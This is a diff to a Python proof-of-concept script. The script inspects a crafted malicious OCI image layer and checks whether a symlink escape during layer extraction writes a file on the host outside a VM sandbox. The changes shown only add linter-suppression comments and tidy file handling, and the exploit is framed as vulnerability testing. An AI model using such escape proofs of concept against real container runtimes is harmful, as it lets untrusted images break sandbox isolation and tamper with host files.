@@ -175,15 +175,18 @@ async def main(runtime=None):
 
     # [2] Show crafted tar entries
     print("\n[2] Malicious layer tar entries:")
-    with open(os.path.join(OCI_LAYOUT_DIR, "index.json")) as f:
+    with open(os.path.join(OCI_LAYOUT_DIR, "index.json")) as f:  # noqa: ASYNC230 - local PoC setup, not a hot path
         idx = json.load(f)
     mf_dgst = idx["manifests"][0]["digest"].split(":")[1]
-    with open(os.path.join(OCI_LAYOUT_DIR, "blobs", "sha256", mf_dgst)) as f:
+    with open(  # noqa: ASYNC230 - local PoC setup, not a hot path
+        os.path.join(OCI_LAYOUT_DIR, "blobs", "sha256", mf_dgst)
+    ) as f:
         mf = json.load(f)
     lyr_dgst = mf["layers"][0]["digest"].split(":")[1]
-    lyr_data = open(
+    with open(  # noqa: ASYNC230 - local PoC setup, not a hot path
         os.path.join(OCI_LAYOUT_DIR, "blobs", "sha256", lyr_dgst), "rb"
-    ).read()
+    ) as f:
+        lyr_data = f.read()
     with tarfile.open(fileobj=io.BytesIO(lyr_data)) as tf:
         for m in tf.getmembers():
             tstr = {
@@ -206,7 +209,7 @@ async def main(runtime=None):
         ) as box:
             r = await box.exec("sh", "-c", "echo ok")
             print(f"    VM stdout: {r.stdout.strip()}")
-    except Exception as e:
+    except Exception as e:  # noqa: BLE001 - box startup can fail in many ways; all are expected here
         # Box may fail to start (incomplete rootfs) — that's fine;
         # the symlink escape occurs during layer extraction, before VM launch.
         print(f"    Box error (expected): {type(e).__name__}: {e}")
@@ -216,7 +219,8 @@ async def main(runtime=None):
     if os.path.exists(TARGET_FILE):
         print("\n  VULNERABLE — host file written successfully!")
         print(f"  Path: {TARGET_FILE}")
-        print(open(TARGET_FILE).read())
+        with open(TARGET_FILE) as f:  # noqa: ASYNC230 - local PoC verification, not a hot path
+            print(f.read())
     else:
         print("\n  NOT VULNERABLE (or already patched)")
 
